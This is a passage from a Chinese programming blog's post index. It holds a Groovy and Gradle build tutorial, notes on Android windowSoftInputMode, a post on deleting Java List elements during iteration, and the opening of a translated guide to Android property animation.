&#123; -&gt; code &#125; // 没有参数 调用闭包的方式有两种： 12closure.call（paramters）closure（paramters） 闭包在Groovy中大量使用，比如很多类都定义了一些函数，这些函数最后一个参数都是一个闭包，又因为函数调用可以省略圆括号，因此我们经常看到如下代码： 12345678910111213141516171819// Android Studio 默认生成一段的Gradle脚本buildscript &#123; repositories &#123; jcenter() &#125; dependencies &#123; classpath &apos;com.android.tools.build:gradle:2.1.0&apos; &#125;&#125;// 脚本补全后形态buildscript (&#123; // 函数参数为闭包 repositories (&#123; // 函数参数为闭包 jcenter() &#125;) dependencies (&#123; // 函数参数为闭包 add(&apos;classpath&apos;, &apos;com.android.tools.build:gradle:2.1.0&apos;) &#125;)&#125;) Closure很方便，但是它一定会和使用它的上下文有极强的关联，当某个函数参数是闭包的时候，我们有时连闭包中传入的参数是什么我们都不知道。 因此我们把闭包当作参数传递的时候一定要注意查看API文档： Groovy API文档：http://www.groovy-lang.org/api.html 举个例子： 12345// 依次打印List中所有元素list = [1, 2, 3]list.each &#123; // each函数的参数是闭包，根据文档会向闭包中传入list的每个元素 println it // 打印闭包的默认参数it&#125; each方法的API如下所示： Groovy 的GDKGroovy基于Java的特性，在JDK上添加了一些方法使得它变成了更灵活的GDK GDK 文档：http://www.groovy-lang.org/gdk.html下面列出一些GDK的常见文件I/O操作： 123456789101112131415161718192021222324252627// 读取文件相关：（targetFile 是一个 File对象）// 读取文件每一行并打印targetFile.eachLine &#123; String line -&gt; println line&#125;// 文件内容一次性读出，返回类型为byte[]targetFile.getBytes()// 操作inputStreamtargetFile.withInputStream &#123; ism -&gt; // 操作inputStream，结束后stream会自动close&#125;// 写文件相关： // 文件流copytargetFile.withOutputStream &#123; osm -&gt; srcFile.withInputStream &#123; ism -&gt; osm &lt;&lt; ism // 利用OutputStream的&lt;&lt;操作符重载完成 &#125;&#125; Groovy 的XML操作Groovy还提供了一些API用于操作XML：http://www.groovy-lang.org/processing-xml.html 下面是一个打印AndroidManifest的versionName的例子，短短几行即可： 123androidManifest = new XmlParser().parse(&apos;AndroidManifest.xml&apos;)println androidManifest[&apos;@android:versionName&apos;]println androidManifest.@&apos;android:versionName&apos; 上面是对Groovy语言的一些较基础的介绍，想要深入了解的同学建议去看看官方的文档继续学习。介绍完Groovy的一些比较基础的知识后，我们再来了解Gradle是什么东西。 Gradle介绍Gradle相关资料首先我们现在这里列出一些Gradle相关的文档资料：Gradle的官网：http://gradle.org/ Gradle 文档位置：https://docs.gradle.org/current/release-notes 其中，文档中几个标签分别为： User Guide：介绍Gradle的一本书 DSLReference：Gradle API的说明 Javadoc：Gradle API的函数文档 Groovydoc：Groovy的文档 Gradle 基本概念首先我们来了解一些Gradle中比较重要的基本概念： Project：在Gradle中，每个待编译的工程称为Project每个Project对应一个build.gradle文件，用于配置Project的属性，类似Makefile Multi-Project： build为了一次性编译多个工程，我们可以构建一个MultiProjectsMultiProjects有一个build.gradle文件，用于配置gradle的配置和其它子Project的属性MultiProjects文还有一个settings.gradle文件，用于指定这个Projects具体包含哪些子Project在Android Studio中，最顶层的MultiProject叫做Project，其子Project叫做Module Task：task是编译过程的执行者每个Project都会包含一系列的task，每个task用于执行特定的编译任务多个task之间可能会存在依赖关系，某个task执行前，会自动执行它所依赖的task，task拥有多种类型，一般我们构建的都是DefaultTask类型，但有时为了特殊的需要，我们也可以构建一些特殊类型的task（如：复制文件 Copy，删除文件 Delete），不同类型的task会帮助我们执行不同的操作 Property：除了task外，Project还包含一系列的Property属性值我们可以通过ext.xxx的方法来为某个Project设置额外的属性值 Plugin：Plugin即插件，插件包含了多个task以及一些与task相关的Property在Project中，我们可以通过apply方法应用插件，我们通过修改插件的Property，执行插件的task得到不同的结果 Gradle 终端常用命令知道了Gradle的一些基本概念后，我们再来了解一下常用的Gradle的命令： gradle xxx（task-name） 执行特定的任务 gradle projects 查看当前Project及其子Project的信息 gradle tasks 查看可执行的任务信息 一些执行task的例子： 执行gradle xxx： 执行gradle projects： 执行gradle tasks： Gradle 工作流程接下来我们来了解一下Gradle的工作流程，Gradle的执行过程可以用下图表示： 从图中可以看出，Gradle的执行过程分为三个步骤： Initialization：遍历文件目录，解析settings.gradle，确定project数目 Configuration：解析每个project下的build.gradle，根据task间的依赖关系生成一个task的有向图 Execution：根据输入的指令与task有向图执行相应的task 其中，三个步骤之间Gradle为我们提供了一些函数用于Hook，这些函数的顺序可以用下图简略表示（详细的请大家去看文档）： 在Gradle的执行过程中，会产生以下三种关键对象： Gradle 对象：Gradle对象在整个执行过程中只有一个，我们可以通过调用它的方法传入闭包，来在工作流程中添加自己的指令（即Hook）。我们在脚本中使用gradle访问该对象 Project 对象：Project对象与build.gradle文件一一对应，可以获取一些关于project的属性信息（如：project文件目录，build文件目录等）或添加Hook。在脚本中用project访问当前的Project对象 Settings 对象：Settings对象与settings.gradle对应 下面举个例子说明Gradle的执行过程： 假设有一个multiProjects文件夹，里面有build.gradle与settings.gradle两个文件，以及project1与project2两个文件夹，两个文件夹中都有build.gradle文件。示意图如下： 其中，settings.gradle文件内容如下： 123println &apos;Initialization&apos;include &apos;project1&apos;include &apos;project2&apos; 打印了Initialization，并引用了project1与project2两个工程 而build.gradle文件内容均如下： 12345println &quot;Configuration $project.name&quot;task myTask &lt;&lt; &#123; println &quot;Execution $project.name&quot;&#125; 其中打印了Configuration 当前工程的名称，并定义了一个名为myTask的任务（任务内容是打印Execution 当前执行工程名称） 下面是使用命令的效果，这些命令均在multiProjects文件夹下运行当我们使用projects命令查看工程结构时： 可以看到我们的顶层project为multiProjects，被包含的两个字Project分别为project1与project2（Android Studio中称为module） 当我们使用tasks查看任务列表时： 可以看到一些Gradle为我们内置的任务，以及我们自定义的任务。其中白色的字体是任务分组名称，绿色字体是任务名称，而黄色字体是任务描述。（这里我们的myTask其实有三个，因为每个project都定义了自己的myTask任务，显示的时候就集中显示了） 接下来我们执行gradle myTask指令时： 从myTask任务的执行过程，我们可以清楚看到Gradle执行的三个阶段。值得注意的是如果出现了多个同名任务，则会都执行一遍 编写settings.gradle学会了一些Gradle相关的基本概念后，我们就来看看如何编写Gradle脚本。由于settings.gradle与Settings对象对应，因此编写settings.gradle实际就上调用Settings对象的函数 Settings对象文档：https://docs.gradle.org/current/dsl/org.gradle.api.initialization.Settings.html编写settings.gradle的主要目标：确定multiProjects（顶层Project）包含哪些子Project一个默认Android工程的settings.gradle文件如下： 脚本中的include就是指包含某个project的意思，这段代码看起来很陌生，其实当我们查阅Settings的函数时我们会发现一个include函数： 结合Groovy语言省略括号与分号的特性，代码就变成了上面略微飘逸的模样。 编写build.gradle（顶层Project）每个project都有自己的build.gradle，接下来讲讲如何编写顶层Project的build.gradle，由于build.gradle与Project对象对应，因此编写build.gradle实际就上调用Project对象的函数 Project对象文档：https://docs.gradle.org/current/dsl/org.gradle.api.Project.html Android官方文档：https://developer.android.com/studio/build/index.html 顶层project的build.gradle主要任务有： 设置gradle整体相关的配置 为子Projects进行统一的配置 先来看默认Android Studio工程顶层Project的build.gradle： 这里引入一个Script Block的概念，其实就是一个函数名称加上大括号，实际上就是一个函数的参数是闭包，然后省略了括号与分号而已。这里调用的函数均可以在Project对象中找到，比如说buildscript函数： 可以看到buildscript会把闭包交个ScriptHandler去处理，根据脚本代码，我们应该可以在ScriptHandler中找到dependencies函数： dependencies函数参数同样是个闭包，而它会把闭包交给DependencyHandler处理，在其中我们可以找到一个add函数（不过为啥add函数可以简写成那个样子我也不是十分清楚了……）： 因此，我们默认的Android Studio工程的build.gradle其实写清楚一点应该是这样子的： 一般而言，当我们需要对Gradle进行整体的设置的时候，对于上述的代码我们只需要看懂即可。因为Android Studio提供了非常人性化的GUI让我们来轻松完成Gradle的设置：打开File-&gt;Project Sturcture设置即可 点击project项用于设置整体gradle环境： 自动生成的build.gradle如下： 但如果你还需要为子Projects进行统一的配置，那就不得不手打一些脚本了，这里给出了一些例子： 其中findAll函数的文档如下： 对于传入其中的闭包，findAll函数会把集合的每个元素当做参数传进去 编写build.gradle（子Project）编写子Project的build.gradle文件主要有两个任务： 应用插件，即Plugin 为project编写依赖 下面是一个默认Android Studio工程子Project的build.gradle： 该脚本主要分为三部分： 最顶端的插件应用声明 中间的插件属性设置 底部的project依赖设置 插件声明部分： Android插件文档：http://google.github.io/android-gradle-dsl/current/index.html 目前我们要使用的插件主要有三种： application：生成apk时使用 library：lib工程使用 test：测试使用 每个插件都有自己对应的属性，可以在文档中查到。以application为例： 可以看到上面默认的脚本就设置了一些必要的属性。 与编写root project的build.gradle一样，我们没有必要完全手写脚本，可以使用Android Studio的GUI解决大部分问题： 点击对应的子project进行设置即可： 其中： Properties：编译属性相关配置，编译的SDK和工具等 Signing：数字签名相关配置 Flavors：打包渠道相关配置，支持的SDK，APP的Id等 BuildTypes：编译类型相关配置，是否混淆，混淆的文件，是否压缩等 Dependencies：依赖相关配置 值得注意的是，生成apk的名称也会有对应的变化： Task相关由于在Gradle中，最后的工作均由task来执行，因此当我们需要添加某些新的功能时，只需要添加task即可Task文档：https://docs.gradle.org/current/dsl/org.gradle.api.Task.html Task文档2：https://docs.gradle.org/current/userguide/more_about_tasks.html 关于创建Task：下面给出三种正确创建task的方法，值得注意的是红框部分不能去掉： 错误的创建task方式如下： 两者的区别何在呢？看回我们Gradle的执行流程图便一目了然了： 对于前面三种创建task的方式，其内容会在Execution阶段执行。而后两种创建task的方式，其内容会在Configuration阶段执行，即用于配置的。举例如下： 可以看到我们执行myTask1，然而因为每个task都必将经历Configuration配置阶段，因此myTask5也打印了自己的输出。 为task添加描述： 我们很简单就可以为task添加描述文字 添加描述后，在使用tasks命令时我们可以看到： 为task分组： 添加分组后，我们在使用tasks命令也可以看到： 使用task类型：为了方便我们创建task，Gradle设置了一些默认的task类型供我们使用。声明task是某种类型，然后在配置阶段修改一些参数，我们即可完成复杂的任务，非常方便。 上面分别是一个删除文件与复制文件的task，task type相关的文档我们可以在Gradle官网找到： 值得注意的是，Task除了包含一些执行的操作外，还包含自己的Property： 例如，通过设置task的inputs与outputs属性，我们可以省略某些执行过程： 由于inputs与outputs在两次执行过程中没有变化，因此该任务属于up-to-date，即不需要再次执行。 当我们需要为我们的工程添加新功能时，我们一般由如下两种做法： 创建task并依赖已有的task 修改已有的task 创建task并依赖已有的task： task依赖设置 方法如下，执行某个task前，Gradle会自动执行依赖的task 执行例子如下（由于myTask2依赖于myTask1，因此执行myTask2前自动执行myTask1）： 这里又引出另一个问题，当我们一次依赖多个task时，这些被依赖的task执行顺序是怎样的呢？答案是随机的。当然我们也可以通过脚本规定他们的顺序： 运行效果如下：执行myTask3，由于依赖关系必须先执行myTask1与myTask2，再根据脚本规定的顺序先执行myTask2 修改已有的task：除了创建新的task外，我们还可以通过向已有task添加内容： 效果如下： 另外，也可以重写某个已有的task： 效果如下： 可以看到，我们添加新的功能都与已有的task相关，这就要求我们必须对已有的task执行流程有个大致的掌握。这里给出一个有向图表示Application plugin 包含的task的执行顺序，具体的大家可以通过gradle tasks –all 来查看： Gradle 相关的文件下面介绍一些常见的Gradle相关的文件： gradle-wrapper.properties：gradle wrapper配置文件，确定gradle wrapper的版本以及存放地点等。gradle wrapper用于解决本地gradle版本与项目不一致问题，在终端使用gradlew代替gradle（即：gradlew xxx） proguard-rules.pro：代码混淆配置文件 gradle.properties：gradle属性配置文件，用于设置gradle下载代理，是否并行编译，是否后台编译，为JVM添加参数 。文档：https://docs.gradle.org/current/userguide/build_environment.html local.properties：用于存储一些和Android相关的变量，也可以存储一些自定义的变量贴一段用于获取属性值的代码： Android Studio 中常见的 Gradle 问题下面分享一些Android Studio中常见问题的解决办法： Gradle下载代理问题 Gradle Wrapper使用本地压缩包 Dependencies 关键词 Jar打包 开启守护进程编译和并行编译 获取工程svn版本号 Gradle下载代理问题： 由于Gradle需要翻墙下载，因此在国内经常会出现在这个步骤卡死的状况，这时我们可以通过设置代理解决问题：找到gradle.properties文件： 添加http与https代理即可： Gradle Wrapper使用本地压缩包： 这个问题与上一个类似，都是因为网络原因导致下载缓慢进而卡死。如果你以前曾经下载过Gradle Wrapper或能找到压缩包文件的话，完全可使用本地的压缩包而不需要去下载。一般而言，以前下载过的gradle wrapper可以在一下路径找到（最后为一串乱码）： C:\\Users\\用户名.gradle\\wrapper\\dists\\gradle-2.10-all\\a4w5fzrkeut1ox71xslb49gst\\ 然后找到gradle-wrapper.properties文件： 修改使用的gradle wrapper地址即可： Dependencies 关键词： 这是博主踩过的一个坑，没弄清楚dependencies里面的关键词导致依赖出现了错误。如图所示，dependencies里面有六个关键词，分别对应不同的依赖方式： 解释如下： Compile：对所有的build type以及favlors都会参与编译并且打包到最终的apk文件中 Provided：对所有的build type以及favlors只在编译时使用，类似eclipse中的external-libs，只参与编译，不打包到最终apk APK：只会打包到apk文件中，而不参与编译，所以不能再代码中直接调用jar中的类或方法，否则在编译时会报错 Test compile：仅仅是针对单元测试代码的编译编译以及最终打包测试apk时有效，而对正常的debug或者release apk包不起作用 Debug compile：仅仅针对debug模式的编译和最终的debug apk打包 Release compile：仅仅针对Release 模式的编译和最终的Release apk打包 Jar打包： Android Studio的library插件只提供aar打包，当我们需要jar包的时候该怎么做呢？一般方法有两种如下： 方法一：复制build/intermediates/bundles/buildType下的classes.jar 该jar是生成aar包过程中的一个中间文件，它就是我们需要的jar包。下面是一段获取该jar的代码： 方法二：依赖Java编译任务，使用Jar任务类型手动打包，使用ProGuardTask任务类型进行代码混淆由于该方法较为复杂，这里就不展开说明了，有兴趣的同学可以参考下面网址：http://chaosleong.github.io/blog/2015/08/02/android-studio-shi-yong-gradle-da-bao-jar/ 开启守护进程编译和并行编译： Gradle在开启守护进程编译和并行编译后，可以显著的提示编译速度，但缺点是并行编译可能导致输出混乱。在gradle.properties文件中，开启守护进程编译与并行编译： 效果如下（可以看到时间明显减少了）： 获取工程svn版本号： 代码如下，其中exec为执行外部命令的函数： 补充内容以下内容转自：https://blog.csdn.net/lisdye2/article/details/79156155 Groovy中闭包的委托对象在Closure中有一个属性为delegate,该属性表示我们可以为闭包设置一个代理对象，那么在闭包中可以直接使用这个代理对象的一些方法。 123456789101112131415161718class DelegateDemo &#123; static void main(String[] args) &#123; Closure c = &#123; // 调用代理对象的方法 test() &#125; // 设置代理对象 c.delegate = new DelegateDemo() //运行闭包 c.call() &#125; void test() &#123; println(&quot;this is delegate&quot;) &#125;&#125; 利用Groovy模仿Gradle中的dependencies依赖声明关键点便在于委托声明一个类用于存储所有的依赖，代码如下： 123456789101112static class Dependency &#123; // 保存所有的依赖 Set&lt;String&gt; api = new HashSet&lt;&gt;(); // 添加依赖的方法 void api(String text)&#123; api.add(text) &#125; // 执行方法，暂时只是打印所有依赖 void exec()&#123; println(api) &#125; &#125; 该类同时将作为一个闭包的代理对象。其次，声明一个方法，该方法的参数为一个闭包。 12345678910static void dependencies(Closure closure) &#123; // 声明一个代理对象 def dependency = new Dependency() // 设置委托 closure.delegate = dependency // 运行闭包 closure.call() // 执行 dependency.exec() &#125; 最后看一下如何使用 1234567static void main(String[] args) &#123; dependencies &#123; api &apos;cn.jiguang.sdk.plugin:xiaomi:3.1.0&apos; api &apos;cn.jiguang.sdk.plugin:huawei:3.1.0&apos; api &apos;cn.jiguang.sdk.plugin:meizu:3.1.0&apos; &#125; &#125; 是不是很眼熟。。。。执行结果： 1[cn.jiguang.sdk.plugin:meizu:3.1.0, cn.jiguang.sdk.plugin:xiaomi:3.1.0, cn.jiguang.sdk.plugin:huawei:3.1.0] 利用Groovy模仿一个Task任务在使用Gradle中，可以通过声明一个task并添加doLast和doFirst回调，而下面就开始仿写一个类似的逻辑。关键点在于闭包和代理对象。根据上一个例子，分为三步：第一步：声明代理委托对象 123456789101112131415161718192021static class Task &#123; String config = \"\" Closure doLast = &#123;&#125; Closure doFirst = &#123;&#125; void doLast(Closure c) &#123; doLast = c &#125; void doFirst(Closure c) &#123; doFirst = c &#125; // 执行任务，只是简单打印一下配置 void exec() &#123; println(config) &#125; // 提供一个配置选项 void config(String text) &#123; config = text &#125; &#125; 第二步：声明一个以闭包作为参数的方法 123456789101112static void task(String name, Closure closure) &#123; def task = new Task() closure.delegate = task // 执行闭包，实质是对task坐初始化 closure() // 调用doFirst task.doFirst.call() // 调用执行方法 task.exec() // 调用doLast()方法 task.doLast.call()&#125; 第三步：使用 1234567891011static void main(String[] args) &#123; &#123; doLast &#123; &#125; doFirst &#123; &#125; &#125; &#125; 在这里，有一个关键，如果闭包作为最后一个参数，那么他可以写到()外面。同时，如果调用的方法的参数如果仅为一个，则可以使用空格的方式，最终如下： 123456789task(&quot;test&quot;) &#123; config &quot;123&quot; doLast &#123; println(&quot;doLast&quot;) &#125; doFirst &#123; println(&quot;doFirst&quot;) &#125; &#125; 打印结果 123doFirst123doLast","categories":[{"name":"gradle","slug":"gradle","permalink":"https://superxlcr.github.io/categories/gradle/"}],"tags":[{"name":"gradle","slug":"gradle","permalink":"https://superxlcr.github.io/tags/gradle/"}]},{"title":"Android windowSoftInputMode属性解析","slug":"Android-windowSoftInputMode属性解析","date":"2016-05-30T12:42:15.000Z","updated":"2020-05-11T07:23:44.525Z","comments":true,"path":"2016/05/30/Android-windowSoftInputMode属性解析/","link":"","permalink":"https://superxlcr.github.io/2016/05/30/Android-windowSoftInputMode属性解析/","excerpt":"","text":"windowSoftInputMode为Android中activity在Manifest.xml中设置的属性之一，主要用于解决屏幕软键盘与Activity布局的问题。 官方说明如下：How the main window of the activity interacts with the window containing the on-screen soft keyboard. The setting for this attribute affects two things: The state of the soft keyboard — whether it is hidden or visible — when the activity becomes the focus of user attention. The adjustment made to the activity’s main window — whether it is resized smaller to make room for the soft keyboard or whether its contents pan to make the current focus visible when part of the window is covered by the soft keyboard. The setting must be one of the values listed in the following table, or a combination of one “state…” value plus one “adjust…” value. Setting multiple values in either group — multiple “state…” values, for example — has undefined results. Individual values are separated by a vertical bar (|). 大意为，该属性主要用于描述activity窗口与软键盘窗口的交互，设置该属性主要会影响两个方面： 软键盘的状态：当Activity被用户获取焦点时，软键盘是显示还是隐藏 Activity窗口的调整：是否通过缩小原视图来为软键盘获取足够的空间，是否通过覆盖的方式来为软键盘获取足够的空间 设置的属性必须是下表的参数之一，或是由“state…”（改变软键盘状态）和”adjust…”（改变Activity窗口调整状态）组合而成，由“|”符号组合两个参数。 windowSoftInputMode参数表 值 描述 stateUnspecified 软键盘的状态未指明，系统会自动根据选择的主题信息执行相应的行为，是系统默认选项 stateUnchanged 当该Activity来到前台时，软键盘保持其原有的状态（在前一个Activity中显示就继续显示，隐藏就继续隐藏） stateHidden 当该Activity是被直接打开时，隐藏软键盘，当该Activity是由按下back键打开时，保持软键盘状态 stateAlwaysHidden 只要进入该Activity软键盘就会被隐藏 stateVisible 当该Activity是被直接打开时，显示软键盘，当该Activity是由按下back键打开时，保持软键盘状态 stateAlwaysVisible 只要进入该Activity软键盘就会被显示 adjustUnspecified Activity窗口的调整未指明，系统会自动根据选择的主题信息执行相应的行为，是系统默认选项，如果存在ScrollView会使用缩小视图的方式，否则使用覆盖的方式 adjustResize 使用缩小视图的方式来为软键盘腾出空间，意味着整体布局底部会上移，空间会缩小，控件可能会挤到一起 adjustPan 通过覆盖的方式来为软键盘获取足够的空间，软键盘会覆盖布局底部控件，要是软键盘盖住了当前输入框的时候整体布局会往上移动","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"view","slug":"view","permalink":"https://superxlcr.github.io/tags/view/"}]},{"title":"语言处理系统结构与编译器编译步骤","slug":"语言处理系统结构与编译器编译步骤","date":"2016-05-30T08:02:07.000Z","updated":"2020-05-11T07:23:44.909Z","comments":true,"path":"2016/05/30/语言处理系统结构与编译器编译步骤/","link":"","permalink":"https://superxlcr.github.io/2016/05/30/语言处理系统结构与编译器编译步骤/","excerpt":"","text":"最近学习了《编译原理》，了解了一些关于语言处理系统结构与编译器编译步骤的知识，在此画下思维图记录。 语言处理系统结构 编译器编译步骤","categories":[{"name":"编译原理","slug":"编译原理","permalink":"https://superxlcr.github.io/categories/编译原理/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"大纲","slug":"大纲","permalink":"https://superxlcr.github.io/tags/大纲/"},{"name":"编译原理","slug":"编译原理","permalink":"https://superxlcr.github.io/tags/编译原理/"}]},{"title":"正确在遍历中删除List元素","slug":"正确在遍历中删除List元素","date":"2016-05-29T16:45:35.000Z","updated":"2020-05-11T07:23:44.856Z","comments":true,"path":"2016/05/30/正确在遍历中删除List元素/","link":"","permalink":"https://superxlcr.github.io/2016/05/30/正确在遍历中删除List元素/","excerpt":"","text":"最近在写代码的时候遇到了遍历时删除List元素的问题，在此写一篇博客记录一下。一般而言，遍历List元素有以下三种方式： 使用普通for循环遍历 使用增强型for循环遍历 使用iterator遍历 使用普通for循环遍历代码如下： 123456789101112131415161718public class Main &#123; public static void main(String[] args) throws Exception &#123; List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; 5; i++) list.add(i); // list &#123;0, 1, 2, 3, 4&#125; for (int i = 0; i &lt; list.size(); i++) &#123; // index and number System.out.print(i + \" \" + list.get(i)); if (list.get(i) % 2 == 0) &#123; list.remove(list.get(i)); System.out.print(\" delete\"); i--; // 索引改变! &#125; System.out.println(); &#125; &#125;&#125; 结果如下： 可以看到遍历删除偶数的结果是成功的，但是这种方法由于删除的时候会改变list的index索引和size大小，可能会在遍历时导致一些访问越界的问题，因此不是特别推荐。 使用增强型for循环遍历1234567891011121314151617public class Main &#123; public static void main(String[] args) throws Exception &#123; List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; 5; i++) list.add(i); // list &#123;0, 1, 2, 3, 4&#125; for (Integer num : list) &#123; // index and number System.out.print(num); if (num % 2 == 0) &#123; list.remove(num); System.out.print(\" delete\"); &#125; System.out.println(); &#125; &#125;&#125; 结果如下： 可以看到删除第一个元素时是没有问题的，但删除后继续执行遍历过程的话就会抛出ConcurrentModificationException的异常。 使用iterator遍历12345678910111213141516171819public class Main &#123; public static void main(String[] args) throws Exception &#123; List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; 5; i++) list.add(i); // list &#123;0, 1, 2, 3, 4&#125; Iterator&lt;Integer&gt; it = list.iterator(); while (it.hasNext()) &#123; // index and number int num = it.next(); System.out.print(num); if (num % 2 == 0) &#123; it.remove(); System.out.print(\" delete\"); &#125; System.out.println(); &#125; &#125;&#125; 结果如下： 可以看到顺利的执行了遍历并删除的操作，因此最推荐的做法是使用iterator执行遍历删除操作。 以上是关于非线程安全的ArrayList，如果是线程安全的CopyOnWriteArrayList呢？ 使用普通for循环遍历123456789101112131415161718public class Main &#123; public static void main(String[] args) throws Exception &#123; List&lt;Integer&gt; list = new CopyOnWriteArrayList&lt;&gt;(); for (int i = 0; i &lt; 5; i++) list.add(i); // list &#123;0, 1, 2, 3, 4&#125; for (int i = 0; i &lt; list.size(); i++) &#123; // index and number System.out.print(i + \" \" + list.get(i)); if (list.get(i) % 2 == 0) &#123; list.remove(list.get(i)); System.out.print(\" delete\"); i--; // 索引改变! &#125; System.out.println(); &#125; &#125;&#125; 结果如下： 可以看到遍历删除是成功的，但是这种方法由于删除的时候会改变list的index索引和size大小，可能会在遍历时导致一些访问越界的问题，因此不是特别推荐。 使用增强型for循环遍历1234567891011121314151617public class Main &#123; public static void main(String[] args) throws Exception &#123; List&lt;Integer&gt; list = new CopyOnWriteArrayList&lt;&gt;(); for (int i = 0; i &lt; 5; i++) list.add(i); // list &#123;0, 1, 2, 3, 4&#125; for (Integer num : list) &#123; // index and number System.out.print(num); if (num % 2 == 0) &#123; list.remove(num); System.out.print(\" delete\"); &#125; System.out.println(); &#125; &#125;&#125; 结果如下： 可以看见与ArrayList遍历删除时情况不同，CopyOnWriteArrayList是允许使用增强型for进行循环遍历删除的。 使用iterator遍历12345678910111213141516171819public class Main &#123; public static void main(String[] args) throws Exception &#123; List&lt;Integer&gt; list = new CopyOnWriteArrayList&lt;&gt;(); for (int i = 0; i &lt; 5; i++) list.add(i); // list &#123;0, 1, 2, 3, 4&#125; Iterator&lt;Integer&gt; it = list.iterator(); while (it.hasNext()) &#123; // index and number int num = it.next(); System.out.print(num); if (num % 2 == 0) &#123; it.remove(); System.out.print(\" delete\"); &#125; System.out.println(); &#125; &#125;&#125; 结果如下： 与ArrayList不同，由于CopyOnWriteArrayList的iterator是对其List的一个“快照”，因此是不可改变的，所以无法使用iterator遍历删除。 综上所述，当使用ArrayList时，我们可以使用iterator实现遍历删除；而当我们使用CopyOnWriteArrayList时，我们直接使用增强型for循环遍历删除即可，此时使用iterator遍历删除反而会出现问题。","categories":[{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/categories/java/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"}]},{"title":"Android 属性动画","slug":"Android-属性动画","date":"2016-05-26T15:39:37.000Z","updated":"2020-05-11T07:23:44.533Z","comments":true,"path":"2016/05/26/Android-属性动画/","link":"","permalink":"https://superxlcr.github.io/2016/05/26/Android-属性动画/","excerpt":"","text":"原文地址：https://developer.android.com/guide/topics/graphics/prop-animation.html 属性动画（Property Animation）属性动画是一个允许让你几乎为任何东西添加动画的强大框架系统。你可以定义一个随着时间的推移改变对象任意属性的动画，不管这个对象是否被绘制到屏幕上。一个属性动画会在一段特定的时间内改变一项属性（一个对象的域）。为了构造属性动画，你需要指定要改变的对象属性，比如说对象在屏幕上的坐标，动画执行的时间和执行动动画的属性值的变动区间（动画起始的值与结束的值）。 属性动画允许你定义动画的下列特性： Duration：动画的执行时间，默认为300ms Time interpolation：你可以指定一个影响动画执行速率的函数（译者注：如先加速后减速，匀速等） Repeat count and behavior：当动画执行完毕的时候，你可以指定动画是否重复，也可以指定动画是否反向执行（复原）。也可以设置反复执行直到一定的次数才停止 Animator sets：你可以把一组动画放入一个集合中，同时执行它们，或顺序地执行，或在延迟特定时间后执行 Frame refresh delay：你可以指定多久刷新一次动画的帧。默认为10ms，不过在应用上的帧刷新速度最终取决于你的设备系统 属性动画是如何工作的（How Property Animation Works）首先，让我们通过一个简单的例子来了解属性动画是如何工作的。图1描述了一个假想的对象执行关于它的x值（代表屏幕上的横坐标）的属性动画。动画执行的时间为设定40ms，动画的属性值的变动区间为40px。每过10ms（默认的帧刷新速度），对象便会在水平方向上移动10px。在40ms的时候，动画停止，而对象也从坐标0移动到40。这是一个使用 linear interpolation（线性速率）的属性动画的例子，意味着对象以一个恒定的速率移动。图1：线性动画例子 你也可以指定动画使用一个非线性的interpolation。图2说明了一个假象的对象执行一个先加速后减速的动画。该对象在40ms中移动了40px，但不是线性的。动画从开头一直加速执行直到中点，然后在动画的后半段开始减速执行。正如图2所示，动画在开头和结尾移动的距离比在中间移动的距离要短。 图2：非线性动画的例子 接下来让我们仔细看看属性动画中的关键组件是如何把上述的动画效果计算出来的。图3描述了这些重要的类是如何一起工作的。 图3：动画如何计算 ValueAnimator对象负责追踪动画的执行时机，比如动画已经执行了多久，动画现阶段的属性值是多少等。 ValueAnimator包含了一个定义动画的interpolation的TimeInterpolator（译者注：主要负责动画的执行速率），和一个定义如何计算属性值的TypeEvaluator。例如，在图2中，TimeInterpolator是AccelerateDecelerateInterpolator（译者注：代表先加速后减速的执行速率），而TypeEvaluator则是IntEvaluator（译者注：负责进行int类型数据的计算）。 要开始一个属性动画，我们需要新建一个ValueAnimator对象，然后设定属性的开始与结束值，以及动画执行的时间。然后当我们调用start方法时，动画就开始了。在动画执行的过程中，ValueAnimator会根据动画的总时间和动画已执行的时间计算出一个elapsed fraction值，其取值范围在0~1。elapsed fraction代表了动画执行的百分比，0表示执行了0%，1表示执行了100%。例如在图1的例子中，elapsed fraction在t = 10ms的时候取值为0.25.当ValueAnimator计算出elapsed fraction后，它会调用设定的TimeInterpolator去计算interpolated fraction。一个interpolated fraction对应着一个elapsed fraction。在图2中，由于动画在开始阶段正在慢慢加速，在t = 10ms时，interpolated fraction的取值为0.15小于elapsed fraction。而在图1中，interpolated fraction与elapsed fraction是处处相等的。当interpolated fraction计算出来后，ValueAnimator会调用合适的TypeEvaluator，通过interpolated fraction，属性的起始值，结束值三个参数来计算当前动画帧的属性值。例如，在图2中，当t = 10ms时，interpolated fraction为0.15，因此属性值为0.15 * （40 - 0），即6. 属性动画与View动画有何不同（How Property Animation Differs from View Animation）View动画系统只提供了让View对象执行动画的能力，因此如果你想要让非View对象执行动画，你就不得不自己实现代码去完成。而且View动画系统还受限于只能执行View对象的一部分动画种类，比如说伸缩或旋转变化，然而像背景色变化这种动画就无法执行。View动画系统的另一个缺点在于，它只能修改View对象绘制的地点，并不能修改View对象实际的地址。例如，如果你通过动画使一个按钮在屏幕上移动了，按钮被绘制在了正确的位置，然而实际上你可以点击按钮的位置却没有改变，因此你不得不实现自己的逻辑去处理这件事情。而在属性动画中，这些缺点都没有了，你可以让任何对象执行动画（View对象或非View对象），而对象的属性也确实被修改了。而且属性动画执行动画的方式也变得更为强大。你可以为任何你想要变化的属性执行动画，比如说颜色、位置、大小等，而且还可以定义动画的许多属性，比如说interpolation和多个动画效果的同步等。然而，View动画系统需要花费更少的时间来设置，同时也只需要编写更少的代码。如果View动画系统已经完成了你想要的效果，或你原来的代码已经实现了你想要的，那么就没有必要再使用属性动画。在不同的情况下，我们应该合理选择不同的动画来使用。 应用接口总览（API Overview）你可以在 android.animation中发现大部分的属性动画API。由于View动画系统已经定义了许多interpolator在 